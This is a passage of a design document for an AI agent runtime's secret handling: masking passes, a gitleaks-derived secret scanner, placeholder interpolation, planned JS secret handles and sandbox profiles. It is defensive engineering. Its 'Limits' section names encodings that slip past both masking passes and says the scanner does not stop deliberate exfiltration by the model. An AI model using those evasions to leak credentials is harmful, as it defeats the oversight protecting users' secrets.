| `web_fetch` | SBX_WEB | broker child | `{{SECRET:name}}` | yes | yes |
| `js_eval` | SBX_JS | broker child | `{{SECRET:name}}` | yes | yes |

### Chokepoints

| Text source | Resolve | Inject | Mask pass 1 | Mask pass 2 |
|-------------|---------|--------|-------------|-------------|
| User message (CLI/channel) | — | — | yes | yes |
| Tool args (outbound) | yes | yes | — | — |
| Tool result (inline) | — | — | yes | yes |
| Tool result (forked shell) | — | — | yes | yes |
| JS eval output | — | — | yes | yes |
| inbox message (channel inbound) | — | — | yes | yes |

The rule: **anything heading into entries goes through both mask passes (via `tool_result_postprocess_q`, the quarantining variant — see [Secret Store](#secret-store)); anything heading into a tool exec goes through inject.**

## Secret Scanner (AC-based Content DLP)

The AC scanner is the second masking pass — it catches secrets the known-value mask couldn't, because they were never stored (a token embedded in a cloned repo, credentials echoed from a subprocess).

### How it works

1. **Aho-Corasick automaton** — keywords compiled into a compressed state machine at build time (from `vendor/gitleaks.toml`). ~335 states, ~35 columns (vs 128 in a naive dense table). O(n) single-pass scan, zero heap allocation. Exact counts live in `src/secret_scan_ac.h` (`SCAN_AC_STATES`, `SCAN_AC_COLS`) and `src/secret_scan_rules.h` (`SCAN_RULE_COUNT`) — regenerated by `scripts/gen_secret_scan.py`, so consult those headers for current values.
2. **Case folding** — scan folds uppercase to lowercase at scan time (`b |= 0x20`); the column remap (`scan_ac_col[128]`) maps both cases to the same column, so uppercase variants are caught without separate rules.
3. **Prefix validation** — on AC match, verify the tail chars match expected charset and length (e.g., `AKIA` + 16 uppercase alphanums).
4. **Case re-check** — case-sensitive rules (e.g. Twilio `SK`) re-verify exact bytes via `strncmp` after the case-insensitive AC prefilter. The AC table is a prefilter only; it never loosens a case-sensitive rule.
5. **Contextual detection** — for generic keywords (`token`, `password`, `api_key`), check for assignment pattern within 30 chars and entropy > 3.5 bits/byte.
6. **Entropy** — Shannon entropy `H = -Σ p(x) log₂ p(x)` over the matched tail. Separates `AKIAIOSFODNN7EXAMPLE` (high entropy, random-looking) from `mypassword` (low entropy, English-like). Entropy is capped at `log₂(tail_max)` — a rule can't demand more bits than the tail length allows distinct symbols.
7. **Redaction** — `secret_scan_redact()` replaces matched regions with `[SECRET_DETECTED:<rule_id>]`. This is still what a bare `secret_scan()` consumer gets; the tool-result/inbox paths instead go through `tool_result_postprocess_q` (see [Secret Store](#secret-store)), which quarantines a finding into the `secrets` table behind a `{{SECRET:PENDING_...}}` placeholder and only falls back to this shred once the pending-secret cap is hit.

### Why AC can't replace known-value masking

The AC scanner detects secrets **by signature** — a distinctive prefix, charset, entropy floor. A user's personal password has no signature: no prefix, often low entropy, no fixed length. It is structurally undetectable by pattern. The known-value mask (pass 1) handles user passwords because cclaw already *has* the value; it scans for the literal string. The two passes are complementary, not redundant:

| | Catches | Mechanism |
|---|---------|-----------|
| Known-value mask | secrets cclaw stored | literal/encoded substring match |
| AC pattern scan | secrets cclaw never saw | signature match |

### Limits of the AC scanner

- **Short/common values are undetectable.** The entropy floor and minimum tail length exist precisely because short values match too much innocent text. A 6-char password can't be reliably distinguished from a word. This is a fundamental limit, not a bug.
- **Encoding evasion.** The scanner catches raw, base64, and URL-encoded variants of known secrets (in the known-value pass) and signature-matching patterns (in the AC pass). Hex encoding, gzip, character splitting, or hashing evade both. The scanner catches *accidental* leakage, not deliberate exfiltration by the model.
- **The model learns secret names through conversation.** If the user says "log into Gmail using GMAIL_PASSWORD", the model knows that name exists. That's expected — the model needs the name to write the placeholder. The security property is that the *value* never enters context, not that the name is hidden.

### Coverage

~73 rules curated from gitleaks (AWS, GCP, Azure, GitHub, GitLab, Anthropic, OpenAI, Slack, Stripe, Twilio, Vault, npm, PyPI, private keys, JWTs, etc.). See `src/secret_scan_rules.h` for the current count (`SCAN_RULE_COUNT`).

Regenerate: `python scripts/gen_secret_scan.py` from `vendor/gitleaks.toml`.

## {{SECRET:name}} Interpolation

Secrets are referenced by placeholder in the LLM context. The full round-trip:

```
LLM writes:  curl -H "Authorization: Bearer {{SECRET:GITHUB_TOKEN}}" ...
cclaw does:  interpolate → execute → deinterpolate → AC scan → store
Stored:      curl -H "Authorization: Bearer {{SECRET:GITHUB_TOKEN}}" ...
```

The actual value **never enters the entries table or context window**.

- `secret_interpolate()` — replaces `{{SECRET:X}}` with real value before tool exec
- `secret_deinterpolate()` — replaces secret values (raw + base64 + URL-encoded) back to `{{SECRET:X}}`, longest first
- AC scanner — catches any other secrets that leaked through output
- All three run in `tool_result_postprocess()`, the single masking chokepoint shared by every tool

Tell the LLM about operator-provisioned secrets in the system prompt:
> You have these secrets available: `{{SECRET:GITHUB_TOKEN}}`, `{{SECRET:NPM_TOKEN}}`.
> Use `{{SECRET:name}}` in tool arguments. Never write actual secret values.

User-provided credentials don't need to be listed in the system prompt — the user will tell the model the name when they ask it to perform a task ("log in using GMAIL_PASSWORD"). The model then writes `{{SECRET:GMAIL_PASSWORD}}` in the tool argument exactly as it would for any other secret.

## JS Secret Handles (design — not yet implemented)

**Today**, `js_eval` is in `tool_needs_interpolation()`, so `{{SECRET:X}}` is substituted into the **JS source text** before `eval`. The plaintext then lives in the QuickJS heap for the whole run — the one place a secret value still enters an interpreter's memory. `web_fetch` avoids this (it resolves in C and hands the value to libcurl; the value never touches an interpreter), and `shell_exec` can't avoid it (cclaw isn't the HTTP client there — see [the Inject section](#inject)). `js_eval` is the case where a real isolation win is cheaply available, because cclaw owns the JS `fetch()` implementation and the engine bindings.

### The model: inject the accessor, not the value

`SECRET` is a **native binding** — a C callback on the JS global, like `fetch` or `console.log`. It is *code, not data*. Calling `SECRET("X")` returns an **opaque handle that carries only the name**, never the plaintext:

```
JS context (QuickJS heap)          C side (trusted)
─────────────────────────          ─────────────────────────
SECRET            ──native──►       callback: wrap name → handle
SECRET("X")  →  <opaque ref "X">    (name only, no value)
crypto.hmac(h, d) ──native──►       resolve "X" in AgentSetup.secrets,
                  ◄── digest        HMAC in C, return only the digest
```

The values already live in C (`AgentSetup.secrets`, loaded at resolve time). Native primitives resolve `name → value` *internally*, do the work, and return only a non-sensitive result. The plaintext is never marshalled into a JS value. This deletes the source-interpolation path: the JS source contains `SECRET("X")` calls, never the value.

A nice consequence: primitive outputs (a digest, a signed token, a TOTP code) reveal nothing about the key, so there is **nothing to mask** on the way back out of these calls.

### Why this is robust (and what forgery does/doesn't buy)

Containment is a property of *which bindings exist*, not of hiding a field. The value stays out of JS because **no native function returns it** — `SECRET` returns a handle, the primitives return outputs. The only binding that would marshal plaintext back into JS is the explicit escape hatch:

- `SECRET("X").reveal() → string` — materializes the plaintext into the JS heap, for the genuine long tail (a bespoke protocol, a library that wants raw bytes, passing the value to a subprocess). One grep-able, **grant-gated** call (requires a `grants` row with `kind='tool'`, `value='secret_reveal'` for the calling agent; denied by default) instead of today's silent always-on source interpolation.

The handle should be a tagged native object (QuickJS class id + opaque), not a plain `{__secretRef:"X"}` literal, so a primitive can confirm it came from `SECRET()` and so `.reveal()` is a real method rather than a forgeable property. But note: **forging a name-handle grants nothing.** A forged `{name:"DEPLOY_KEY"}` passed to `hmac` resolves the same secret a real `SECRET("DEPLOY_KEY")` would — the model can name any *scoped* secret anyway, and resolution still fails for anything outside the agent's scope. The tag is hygiene and the anchor for `reveal()`, not the security boundary.

### Primitive set, by priority

Each takes a handle, consumes the secret in C, returns a maskingsafe output.

**Tier 1 (~80% of real auth):**

| Primitive | JS shape | Covers |
|-----------|----------|--------|
| fetch header inject | `fetch(url, {headers:{Authorization:"Bearer "+SECRET("X")}})` | bearer tokens, API keys, Basic auth |
| HMAC | `crypto.hmac("sha256", SECRET("X"), data) → hex/b64` | webhook signing, custom HMAC auth; building block for the rest |

HMAC is load-bearing: HS256-JWT and TOTP become thin wrappers, and AWS SigV4 is a JS recipe where only the first HMAC takes the root handle (`hmac(SECRET("AWS"), date)` → `kDate` in C; the chain continues on derived keys, root never enters JS).

**Tier 2 (cheap once HMAC exists):** `totp(SECRET("X")) → code`; `crypto.signJwt(SECRET("X"), {claims}) → token` (HS256).

**Tier 3 (deferred — bigger lift):** asymmetric signing (JWT RS256/ES256) needs RSA/ECDSA, which vendored monocypher does not provide (it has Ed25519/X25519/ChaCha/BLAKE2/SHA-512, not RSA or SHA-256). Defer until demanded.

**Implementation cost:** HMAC-SHA256 needs SHA-256, absent from monocypher — ~150 lines of vendored public-domain SHA-256 plus a thin HMAC wrapper. Small but net-new crypto; everything in Tier 1/2 sits on that one addition. Building just **fetch-inject + `crypto.hmac`** covers bearer/API-key, webhook signing, SigV4, HS256-JWT and TOTP with the root secret staying in C.

### When the value genuinely belongs in JS

Some auth fundamentally needs the raw key in the compute context — the algorithm consuming the secret lives in the JS, not in a header-interpolator (HMAC/SigV4/JWT signing, TOTP), or the use isn't a request at all (local decryption, a JS DB driver, deriving a child key). The handle + C-primitive model covers the common members of that set without revealing the root; `.reveal()` covers the rest, deliberately and visibly. The goal is not "secrets never touch JS" — it is "value-in-JS is opt-in and audited, not the default."

## Sandbox Profile Policy Bundles

The `agents.sandbox_profile` column maps to a shell sandbox profile:

| Policy | host | trusted | standard (default) | restricted |
|--------|------|---------|-------------------|------------|
| sandbox | none | namespace | namespace | namespace |
| env | inherit + scrub | inherit + scrub | clean allowlist | clean allowlist |
| network | direct (no proxy) | proxy | proxy | none |
| CWD mount | n/a (host fs) | rw | no | no |
| workspace | rw (host fs) | rw | rw | ro |
| RLIMIT_NPROC | none | none | 64 | 8 |
| RLIMIT_AS | none | none | 512MB | 128MB |
| RLIMIT_CPU | none | none | 60s | 10s |

- `secret_agent` (future) maps to `standard` with additional restriction: only `secret_store_write` tool grant, no shell
- Unknown values (including any legacy values like `bootstrap`) fall through to `standard` in `sandbox_policy_from_profile()` (`src/sandbox.c`)
- Resolved once in `agent_setup_init()` via `sandbox_profile_resolve()`, stored in `SandboxProfile`
- **`.cclaw_key` and the DB family are bind-masked** inside every sandboxed child, so even the CWD-mounting `trusted` level can't read the secret key or DB ciphertext. Only `host` (no sandbox) is exposed. See [Secret Storage](#secret-storage).
